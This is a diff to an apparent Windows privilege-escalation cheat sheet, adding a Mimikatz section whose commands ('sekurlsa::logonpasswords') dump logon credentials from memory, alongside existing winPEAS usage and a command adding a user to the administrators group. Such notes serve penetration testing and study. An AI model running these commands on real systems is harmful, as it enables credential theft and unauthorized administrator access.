@@ -19,6 +19,16 @@ Example commands:
 .\winPEASany.exe quiet cmd systeminfo
 ```
 
+#### Mimikatz
+
+TODO
+
+```text
+log
+loglevel::debug
+sekurlsa::logonpasswords
+```
+
 #### accesschk.exe
 
 TODO
@@ -64,4 +74,6 @@ Add low privileged user to the administrators group:
 ```text
 > net localgroup administrators <username> /add
 ```
+
+
 
